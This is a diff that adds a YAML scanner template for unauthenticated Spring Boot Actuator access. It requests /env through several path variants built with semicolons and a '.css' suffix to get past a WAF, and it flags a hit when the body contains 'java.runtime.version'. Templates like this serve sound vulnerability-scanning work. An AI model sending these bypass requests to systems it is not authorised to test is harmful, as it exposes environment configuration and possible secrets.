@@ -1,0 +1,17 @@
+id: Actuator_noauth_bypass_waf
+info:
+  name: Actuator API 未授权访问 (绕过WAF)
+  finger: Actuator
+  severity: info
+  tags:
+  - legacy
+  - noauth
+transport: http
+requests:
+- method: GET
+  paths:
+  - /actuator;/env;.css
+  - /api/actuator;/env;.css
+  - /api;/env;.css
+  - /;/env;.css
+  expression: contains(body, "java.runtime.version")
